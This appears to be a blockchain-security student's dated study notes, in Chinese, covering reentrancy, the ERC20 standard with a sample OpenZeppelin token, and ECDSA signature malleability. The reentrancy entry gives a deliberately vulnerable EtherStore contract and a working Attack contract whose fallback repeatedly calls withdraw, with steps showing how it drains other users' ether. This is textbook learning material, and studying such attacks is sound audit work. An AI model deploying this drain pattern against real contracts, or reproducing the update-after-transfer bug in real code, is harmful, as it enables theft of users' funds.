---
timezone: UTC+8
---

# 刘星璇

**GitHub ID:** Ariko77

**Telegram:** @paekko

## Self-introduction

区块链工程专业在校学生，目前努力方向是区块链安全审计，还是小白

## Notes

<!-- Content_START -->
# 2025-08-06

# 重入漏洞
定义：如果外部调用的目标是一个攻击者可以控制的恶意的合约，那么当被攻击的合约在调用恶意合约的时候攻击者可以执行恶意的逻辑然后再重新进入到被攻击合约的内部，通过这样的方式来发起一笔非预期的外部调用，从而影响被攻击合约正常的执行逻辑
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;
contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
withdraw()函数中有一个外部调用(bool sent, ) = msg.sender.call{value: bal}("");

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
1. 部署EtherStore合约
2. A和B分别充值1以太,此时EtherStore合约有2个以太
3. 攻击者C调用Attack.attack函数,Attack.attack又调用EtherStore.deposit函数,充值一个以太到EtherStore合约中
4. Attack.attack又调用etherStore.withdraw函数将刚刚自己充值的一个以太拿走,此时EtherStore合约中就还剩两个以太(A、B充值的那俩)
5. 当Attack.attack调用etherStore.withdraw函数时会触发Attack.fallback函数,注意这个函数里的逻辑是,此时只要EtherStore合约中的以太大于等于1都会一直调用withdraw直到以太小于一,所以最后C拿走了剩下的两个以太币

# 2025-08-05

ERC20
IERC20是ERC20代币标准的接口合约，规定了ERC20代币需要实现的函数和事件
pragma solidity ^0.8.20;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}
6个函数
1. totalSupply()：查看此合约发行的ERC-20代币总量，
2. balanceOf() ：某个地址上的余额
3. transfer() ： 发送token，即转账

  ○ to不能是一个空地址
  ○ caller至少有value这么多余额
  ○ emit一个transfer事件
4. allowance() ：查看owner给spender授权的可转账额度
5. approve() ：owner给spender授权一定的转账额度（来自owner账户）

  ○ spender不能是一个空地址
  ○ emit一个approval事件
6. transferFrom()： spender用owner的代币进行转账，金额需要同时小于allowance和owner的余额
  ○ from和to都不可以是空地址
  ○ from的余额至少有value这么多
  ○ caller必须有来自from的至少value这么多的额度(allowance),就是from需要提前为msg.sender授权，即 from亲自去调用approve()函数
2个事件
触发事件需要emit，不是条件成立就直接触发
1. Transfer() ： 转账成功触发的事件触发条件：当 value 单位的货币从账户 (from) 转账到另一账户 (to)时
2. Approval() ：给某账户授权一定额度的事件触发条件：当 value 单位的货币从账户 (owner) 授权给另一账户 (spender)时
_mint() 和 _burn()
都是internal类型
● _mint() : 
_mint(address to, uint256 amount)
给地址 to 铸造（发放）amount 份额
● _burn():
_burn(address from, uint256 amount)
从地址 from 销毁 amount 份额

ERC20
ERC代表Ethereum Request for Comment。从本质上讲，它们是已获得社区批准的标准，用于传达某些用例的技术要求和规范。
ERC-20特别是一个标准，它概述了可替代代币的技术规范.
1. 6个函数
● totalSupply()： token的总量
● balanceOf() ：某个地址上的余额
● transfer() ： 发送token
● allowance() ：额度、配额、津贴
● approve() ： 批准给某个地址一定数量的token(授予额度、授予津贴)
● transferFrom()： 提取approve授予的token(提取额度、提取津贴)
标准函数	含义
totalSupply()	代币总量
balanceOf(addresss account)	account地址上的余额
transfer(address recipient, uint256 amount)	向recipient发送amount个代币
allowance(address owner, address spender)	查询owner给spender的额度(总配额)
approve(address spender, uint256 amount)	批准给spender的额度为amount(当前配额)
transferFrom(address sender, address recipient, uint256 amount)	recipient提取sender给自己的额度
2. 2个事件
● Transfer() ： token转移事件
● Approval() ：额度批准事件
事件	含义
Transfer(address indexed from, address indexed to, uint256 value)	代币转移事件：从from到to转移value个代币
Approval(address indexed owner, address indexed spender, uint256 value)	额度批准事件：owner给spender的额度为value
3. 实践(还没学完)
参考的网址https://learnblockchain.cn/article/4327(不知道靠不靠谱)
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol";//这都是一行

    contract LW3Token is ERC20 {
    constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol) {
    _mint(msg.sender, 10 * 10 ** 18);
    }
}

在构造函数中，我们需要来自用户的两个参数——_name它们_symbol指定我们加密货币的名称和符号。例如。名称 = 以太坊，符号 = ETH
在指定构造函数后，我们立即调用ERC20(_name, _symbol)
ERC20我们从 OpenZeppelin 导入的合约有它自己的构造函数，它需要name和symbol参数。由于我们正在扩展 ERC20 合约，因此我们需要在部署 ERC20 合约时初始化 ERC20 合约。
所以，作为我们构造函数的一部分，我们还需要调用ERC20合约上的构造函数。因此，我们为我们的合约提供_name和_symbol变量，我们立即将其传递给ERC20构造函数，从而初始化ERC20智能合约。`
_mint是标准合约中的一个internal函数ERC20,_mint接受两个参数 - 铸造地址和铸造代币数量
调用该_mint函数将一些代币铸造到msg.sender
10 * 10 ** 18:我希望将 10 个完整令牌铸造到我的地址

# 2025-08-04

今天忙着搬家 简单学了一点
以太坊交易使用的是 **ECDSA**（椭圆曲线数字签名算法）。一个签名由以下三部分组成：

+ `r`（32字节）
+ `s`（32字节）
+ `v`（1字节，用来标识哪个公钥对应这个签名）

# 签名冒充impersonation
在某些合约中，可能存在这样的验证逻辑：

```plain
address recovered = ecrecover(hash, v, r, s);
require(recovered == expectedSigner);
```

这段逻辑的意思是：**只要你能提供一个合法签名，它 recover 出来的地址是某个特定地址，那就放你过。**

# 签名可拓展性
ECDSA 签名是 **不唯一的！** 对于一个消息 `m` 和私钥 `sk`，你可以构造 **多个不同的签名**，它们都能成功通过验证。

主要原因在于：

对同一个 `(r, s)`，也可以构造 `(r, -s mod n)`，它也是合法的签名。

以太坊中，为了避免这种问题，现在规定：

+ `s` 必须在 `n / 2` 以下（`n` 是椭圆曲线的阶）
+ 否则签名就是非法的

但如果合约自己实现 `ecrecover` 验证，而**没有验证 **`**s**`** 是否小于 **`**n/2**`，那攻击者就可以“拓展”签名，**用另一个合法但不同的 **`**(r, s)**`** 对伪造签名**，从而伪装成原始签名者。


# 2025.07.30


<!-- Content_END -->
